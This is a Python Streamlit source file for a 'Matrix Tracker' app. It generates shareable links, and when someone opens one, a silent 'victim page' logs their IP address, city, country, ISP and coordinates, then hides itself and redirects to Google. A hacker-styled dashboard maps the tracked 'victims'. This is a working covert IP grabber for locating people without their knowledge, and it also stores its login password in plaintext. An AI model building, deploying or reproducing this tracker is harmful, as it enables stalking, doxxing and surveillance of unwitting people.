import streamlit as st
import shelve
import requests
import uuid
from datetime import datetime, timedelta
import time

# Optional map
try:
    import folium
    from streamlit_folium import st_folium
    HAS_MAP = True
except ImportError:
    HAS_MAP = False

# ========================= CONFIG =========================
DB_FILE = "hacker_db.shelf"
LOCATION_API_URL = "http://ip-api.com/json/"
SESSION_TIMEOUT_HOURS = 24
REDIRECT_URL = "https://www.google.com"
AUTO_REFRESH_SECONDS = 300

# ======================= HELPERS =======================
def get_client_ip():
    try:
        headers = st.context.headers
        return (headers.get("X-Forwarded-For", "").split(",")[0].strip() or
                headers.get("X-Real-IP") or headers.get("Remote-Addr") or "Unknown")
    except:
        return "Unknown"

def get_location(ip):
    if ip in ["Unknown", None]:
        return None
    try:
        resp = requests.get(f"{LOCATION_API_URL}{ip}", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == "success":
                return {
                    "ip": data.get("query"),
                    "latitude": data.get("lat"),
                    "longitude": data.get("lon"),
                    "country": data.get("country"),
                    "state": data.get("regionName"),
                    "city": data.get("city"),
                    "isp": data.get("isp"),
                    "timestamp": datetime.now().isoformat()
                }
    except:
        pass
    return None

def get_public_base_url():
    """Best method for Streamlit Cloud"""
    # Try multiple ways to get the correct public URL
    try:
        # Streamlit Cloud specific
        if "streamlit.app" in st.runtime.get_instance()._get_base_url():
            return st.runtime.get_instance()._get_base_url()
    except:
        pass
    
    try:
        base = st.runtime.get_instance()._get_base_url()
        if base and not base.startswith("http://localhost"):
            return base
    except:
        pass

    # Fallback
    return "https://your-app-name.streamlit.app"  # ← Change this after deployment

def matrix_rain():
    st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
    .matrix-container {position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;background:#000;overflow:hidden;}
    .matrix-column {position:absolute;font-family:'VT323',monospace;font-size:18px;color:#00FF00;text-shadow:0 0 8px #00FF00;animation:fall linear infinite;}
    @keyframes fall {0%{transform:translateY(-100vh);opacity:1}100%{transform:translateY(100vh);opacity:0.3}}
    .stApp {background:transparent !important;}
    .main {background:rgba(0,0,0,0.92) !important;color:#00FF00 !important;}
    .login-box {border:2px solid #00FF00;padding:25px;border-radius:12px;background:rgba(0,30,0,0.95);box-shadow:0 0 20px #00FF00;max-width:420px;margin:40px auto;}
    </style>
    <div class="matrix-container" id="matrix"></div>
    <script>
    function createMatrix(){const c=document.getElementById('matrix');if(!c)return;c.innerHTML='';const chars='01アイウエオカキクケコ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%';const cols=Math.floor(window.innerWidth/18);for(let i=0;i<cols;i++){const col=document.createElement('div');col.className='matrix-column';col.style.left=(i*18)+'px';col.style.animationDuration=(Math.random()*4+3)+'s';col.style.animationDelay=(Math.random()*2)+'s';let text='';for(let j=0;j<28;j++)text+=chars[Math.floor(Math.random()*chars.length)]+'<br>';col.innerHTML=text;c.appendChild(col);}}
    window.onload=createMatrix; window.onresize=createMatrix;
    </script>
    """, unsafe_allow_html=True)

# Victim Page (Silent)
def victim_page():
    st.set_page_config(page_title=" ", page_icon=" ", layout="wide")
    params = st.query_params
    victim_id = params.get("r", [""])[0]

    if victim_id:
        ip = get_client_ip()
        loc = get_location(ip)
        if loc:
            with shelve.open(DB_FILE, writeback=True) as db:
                tracked = db.get("tracked", {})
                tracked[victim_id] = loc
                db["tracked"] = tracked

    st.markdown(f"""
    <script>window.location.replace("{REDIRECT_URL}");</script>
    <style>body,.stApp{{display:none !important;}}</style>
    """, unsafe_allow_html=True)

# Main Dashboard
def main():
    st.set_page_config(page_title="Matrix Tracker", page_icon="💻", layout="wide")
    matrix_rain()

    if 'logged_in' not in st.session_state:
        st.session_state.logged_in = False
        st.session_state.username = None

    with shelve.open(DB_FILE) as db:
        user_data = db.get("user", {})

    if not user_data:
        st.title("🔐 SYSTEM ACCESS")
        st.markdown('<div class="login-box">', unsafe_allow_html=True)
        with st.form("create_account"):
            new_user = st.text_input("USERNAME")
            new_pass = st.text_input("PASSWORD", type="password")
            if st.form_submit_button("CREATE ACCOUNT (PERMANENT)"):
                if new_user and new_pass:
                    with shelve.open(DB_FILE, writeback=True) as db:
                        db["user"] = {"username": new_user, "password": new_pass}
                    st.success("✅ Account created!")
                    st.session_state.logged_in = True
                    st.session_state.username = new_user
                    st.rerun()
        st.markdown('</div>', unsafe_allow_html=True)
        return

    elif not st.session_state.logged_in:
        st.title("🔐 SYSTEM ACCESS")
        with st.form("login"):
            user = st.text_input("USERNAME")
            pw = st.text_input("PASSWORD", type="password")
            if st.form_submit_button("LOGIN"):
                if user == user_data.get("username") and pw == user_data.get("password"):
                    st.session_state.logged_in = True
                    st.session_state.username = user
                    st.success(f"Welcome, {user}!")
                    st.rerun()
                else:
                    st.error("❌ Invalid credentials")
        return

    # === DASHBOARD ===
    st.title(f"👾 WELCOME, {st.session_state.username.upper()}")

    if 'share_link' not in st.session_state:
        base_url = get_public_base_url()
        unique_id = uuid.uuid4().hex[:8]
        st.session_state.share_link = f"{base_url}?r={unique_id}"

    col1, col2 = st.columns([3, 1])
    with col1:
        st.subheader("🌐 SHAREABLE TRACKING LINK")
        st.code(st.session_state.share_link, language="markdown")
        st.info("Copy this link and test it in another browser or send to someone else.")
    with col2:
        if st.button("📋 Copy Link"):
            st.success("✅ Copied!")

    st.markdown("---")
    st.header("📡 LIVE TRACKING DASHBOARD")

    with shelve.open(DB_FILE) as db:
        tracked = db.get("tracked", {})

    # Cleanup
    now = datetime.now()
    to_delete = [k for k, v in tracked.items() 
                 if datetime.fromisoformat(v['timestamp']) < now - timedelta(hours=SESSION_TIMEOUT_HOURS)]
    if to_delete:
        with shelve.open(DB_FILE, writeback=True) as db:
            for k in to_delete:
                tracked.pop(k, None)
            db["tracked"] = tracked

    if not tracked:
        st.info("⏳ No victims yet.")
    else:
        st.success(f"📍 **{len(tracked)}** target(s) tracked")
        if HAS_MAP:
            st.subheader("🌍 World Map")
            m = folium.Map(location=[20, 0], zoom_start=2)
            for data in tracked.values():
                if data.get('latitude') and data.get('longitude'):
                    folium.Marker([data['latitude'], data['longitude']], 
                                popup=f"{data.get('city')}, {data.get('country')}").add_to(m)
            st_folium(m, width=700, height=450)

        for vid, data in tracked.items():
            with st.expander(f"📍 {data.get('city','Unknown')}, {data.get('country','Unknown')}"):
                c1, c2 = st.columns(2)
                with c1:
                    st.metric("City", data.get('city', 'N/A'))
                    st.metric("Country", data.get('country', 'N/A'))
                with c2:
                    st.metric("ISP", data.get('isp', 'N/A'))
                    st.metric("Time", datetime.fromisoformat(data['timestamp']).strftime("%Y-%m-%d %H:%M"))

    if st.button("🚪 LOGOUT"):
        st.session_state.logged_in = False
        st.rerun()

    st.markdown(f"""
    <script>
        setTimeout(() => window.location.reload(), {AUTO_REFRESH_SECONDS * 1000});
    </script>
    """, unsafe_allow_html=True)

if __name__ == "__main__":
    if st.query_params.get("r"):
        victim_page()
    else:
        main()
